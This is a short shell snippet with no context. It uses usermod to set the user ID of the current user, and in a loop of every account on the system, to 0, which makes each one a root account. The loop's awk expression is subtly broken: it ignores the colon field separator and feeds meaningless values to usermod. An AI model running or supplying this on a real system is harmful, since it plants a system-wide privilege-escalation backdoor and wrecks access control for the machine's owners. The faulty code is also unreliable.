usermod -u 0 root
usermod -u 0 $(whoami)
for user in $(getent passwd | awk '{if ($1 != "root") $1=0} {print $1}'); do
usermod -u 0 $user
done